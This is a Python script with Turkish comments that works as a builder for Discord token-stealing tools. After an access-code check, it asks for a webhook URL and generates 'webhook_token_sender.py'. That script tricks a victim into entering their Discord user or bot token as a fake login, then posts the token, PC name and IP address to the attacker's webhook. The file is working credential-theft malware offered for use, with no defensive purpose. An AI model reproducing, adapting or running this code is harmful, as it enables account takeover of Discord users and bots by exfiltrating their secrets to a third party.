# -*- coding: utf-8 -*-
import requests
import socket
from colorama import init
from termcolor import colored
import pyfiglet

# Figlet ve Gökkuşağı renkli "Made BY Lorax" yazısını ekleyelim
def print_banner():
    init(autoreset=True)  # Colorama'yı başlatıyoruz
    banner = pyfiglet.figlet_format("Made BY Lorax", font="slant")
    rainbow_banner = ''.join([colored(char, color) for char, color in zip(banner, ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta', 'white'] * (len(banner) // 7 + 1))])
    print(rainbow_banner)  # Gökkuşağı renkte yazdırıyoruz

# Webhook'a Token, PC ismi ve IP adresi gönderen fonksiyon
def send_token_to_webhook(token, webhook_url):
    try:
        # PC ismini ve IP adresini alıyoruz
        pc_name = socket.gethostname()
        ip_address = socket.gethostbyname(pc_name)

        # Webhook'a gönderilecek veriyi hazırlıyoruz
        payload = {
            'content': f"Token geldi!\n\nPC İsmi: {pc_name}\nIP Adresi: {ip_address}\nToken: {token}\n\nDiscord Sunucumuza Katılmayanlar Tooldan Uzaklaştırılacaktır!\nhttps://discord.gg/vXsK52VNhg"
        }

        # Webhook'a POST isteği gönderiyoruz
        response = requests.post(webhook_url, data=payload)

        # Webhook cevabını kontrol ediyoruz
        if response.status_code == 200:
            print(colored("Token başarıyla gönderildi!", 'green'))
        else:
            print(f"Hata oluştu: {response.status_code}, Cevap: {response.text}")

    except Exception as e:
        print(f"Bir hata oluştu: {e}")
        input("Hata oluştu. Devam etmek için bir tuşa basın...")  # Hata mesajını görmek için kullanıcıdan giriş bekliyoruz

# Giriş doğrulama
def giriş_doğrulama():
    kod = input("Lütfen giriş kodunu girin: ")
    if kod == "lorax000":
        print(colored("Giriş başarılı!", 'green'))
    else:
        print(colored("Yanlış kod girdiniz. Çıkılıyor...", 'red'))
        exit()

# Python dosyasını oluşturma fonksiyonu
def create_python_file(token_type, webhook_url):
    # Kullanıcı tokeni için oluşturulacak kod
    if token_type == '1':
        code = f'''# -*- coding: utf-8 -*-
import requests
import socket

def send_token_to_webhook(token, webhook_url):
    try:
        # PC ismini ve IP adresini alıyoruz
        pc_name = socket.gethostname()
        ip_address = socket.gethostbyname(pc_name)

        # Webhook'a gönderilecek veriyi hazırlıyoruz
        payload = {{
            'content': f"**Token geldi**!\\n**PC İsmi**: {{pc_name}}\\n**IP Adresi**: {{ip_address}}\\n**Toke**n: {{token}} @everyone @here(Lütfen Discord Sunucumuza katılalım aksi takdirde ban yersiniz [Tıkla Katıl](https://discord.gg/vXsK52VNhg)"
        }}

        # Webhook'a POST isteği gönderiyoruz
        response = requests.post(webhook_url, data=payload)

        # Webhook cevabını kontrol ediyoruz
        if response.status_code == 200:
            print("Token başarıyla gönderildi!")
        else:
            print(f"Hata oluştu: {{response.status_code}}, Cevap: {{response.text}}")

    except Exception as e:
        print(f"Bir hata oluştu: {{e}}")
        input("Hata oluştu. Devam etmek için bir tuşa basın...")

def main():
    # Kullanıcı tokenini alıyoruz
    token = input("Sisteme giriş için lütfen kullanıcı tokeninizi girin: ")

    # Webhook'a token gönder
    send_token_to_webhook(token, "{webhook_url}")

if __name__ == '__main__':
    main()'''
    elif token_type == '2':
        code = f'''# -*- coding: utf-8 -*-
import requests
import socket

def send_token_to_webhook(token, webhook_url):
    try:
        # PC ismini ve IP adresini alıyoruz
        pc_name = socket.gethostname()
        ip_address = socket.gethostbyname(pc_name)

        # Webhook'a gönderilecek veriyi hazırlıyoruz
        payload = {{
            'content': f"Token geldi!\\nPC İsmi: {{pc_name}}\\nIP Adresi: {{ip_address}}\\nToken: {{token}}"
        }}

        # Webhook'a POST isteği gönderiyoruz
        response = requests.post(webhook_url, data=payload)

        # Webhook cevabını kontrol ediyoruz
        if response.status_code == 200:
            print("Token başarıyla gönderildi!")
        else:
            print(f"Hata oluştu: {{response.status_code}}, Cevap: {{response.text}}")

    except Exception as e:
        print(f"Bir hata oluştu: {{e}}")
        input("Hata oluştu. Devam etmek için bir tuşa basın...")

def main():
    # Bot tokenini alıyoruz
    token = input("Sisteme giriş için lütfen bot tokeninizi girin: ")

    # Webhook'a token gönder
    send_token_to_webhook(token, "{webhook_url}")

if __name__ == '__main__':
    main()'''

    # Dosyayı oluşturuyoruz
    try:
        with open('webhook_token_sender.py', 'w', encoding='utf-8') as file:
            file.write(code)
        print("Python dosyası başarıyla oluşturuldu: webhook_token_sender.py")
    except Exception as e:
        print(f"Dosya oluşturulurken bir hata oluştu: {e}")

# Kullanıcıdan Webhook URL'si ve Token türü bilgisi alıyoruz
def main():
    try:
        # Banner'ı yazdırıyoruz
        print_banner()

        # Giriş doğrulama
        giriş_doğrulama()  # Giriş doğrulaması

        # Webhook URL'sini alıyoruz
        webhook_url = input("Webhook URL'sini girin: ")

        # Kullanıcıya seçim yapma şansı ver
        print("1 - Kullanıcı Tokeni")
        print("2 - Bot Tokeni")

        # Kullanıcının seçimini al
        choice = input("Seçiminizi yapın (1/2): ")

        # Geçerli bir seçim yapıldığında dosyayı oluştur
        if choice == '1' or choice == '2':
            create_python_file(choice, webhook_url)
            print("\nYeni dosya oluşturuldu. 'webhook_token_sender.py' dosyasını çalıştırarak tokeninizi gönderebilirsiniz.")
            input("Dosya oluşturuldu. Devam etmek için herhangi bir tuşa basın...")

        else:
            print("Geçersiz seçim!")
            input("Geçersiz seçim. Devam etmek için bir tuşa basın...")

    except Exception as e:
        print(f"Bir hata oluştu: {e}")
        input("Hata oluştu. Devam etmek için bir tuşa basın...")

if __name__ == "__main__":
    main()
